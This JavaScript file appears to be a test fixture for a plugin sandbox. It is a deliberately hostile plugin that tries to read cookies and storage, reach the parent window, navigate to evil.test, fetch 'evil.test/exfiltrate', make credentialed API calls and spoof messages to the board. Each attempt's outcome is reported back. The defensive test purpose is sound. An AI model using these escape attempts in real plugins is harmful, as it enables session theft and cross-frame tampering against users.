// A hostile plugin: tries everything the sandbox must prevent and reports what happened by
// loading an image from its own asset base (the one thing its CSP allows).
const report = (name, value) => {
  const img = new Image();
  img.src = new URL(
    `report.png?${name}=${encodeURIComponent(JSON.stringify(value))}`,
    import.meta.url,
  ).href;
};
const attempt = (name, fn) => {
  try {
    report(name, { ok: true, value: fn() ?? null });
  } catch (e) {
    report(name, { ok: false, error: String(e && e.name) });
  }
};

attempt('cookie', () => document.cookie);
attempt('localStorage', () => window.localStorage.getItem('x'));
attempt('parentDocument', () => window.parent.document.title);
attempt('parentLocation', () => window.parent.location.href);
attempt('popup', () => (window.open('http://evil.test/popup') === null ? 'blocked' : 'opened'));
attempt('topNavigation', () => {
  window.top.location.href = 'http://evil.test/navigated';
  return 'assigned';
});
fetch('http://app.test/api/boards', { credentials: 'include' }).then(
  (r) => report('fetchApi', { ok: true, status: r.status }),
  (e) => report('fetchApi', { ok: false, error: String(e && e.name) }),
);
fetch('http://evil.test/exfiltrate').then(
  () => report('fetchForeign', { ok: true }),
  (e) => report('fetchForeign', { ok: false, error: String(e && e.name) }),
);
// spoofing: talk to the board's window directly instead of the port
window.parent.postMessage(
  { type: 'block.setProps', v: 1, requestId: 'spoof', payload: { props: { pwned: true } } },
  '*',
);

window.addEventListener('message', (event) => {
  if (
    event.source !== window.parent ||
    event.data?.type !== 'connect' ||
    event.ports.length !== 1
  ) {
    return;
  }
  const port = event.ports[0];
  port.onmessage = (e) => {
    const m = e.data;
    if (m.type === 'init') {
      report('init', { user: m.payload.user, capabilities: m.payload.capabilities });
      port.postMessage({ type: 'ready', v: 1, payload: {} });
      // not granted: must be refused
      port.postMessage({
        type: 'block.setProps',
        v: 1,
        requestId: 'p1',
        payload: { props: { pwned: true } },
      });
      // a foreign block cannot even be named
      port.postMessage({
        type: 'block.setProps',
        v: 1,
        requestId: 'p2',
        payload: { props: { pwned: true }, blockId: 'other' },
      });
    } else if (m.requestId) {
      report(`reply-${m.requestId}`, { type: m.type, code: m.payload.code });
    }
  };
});
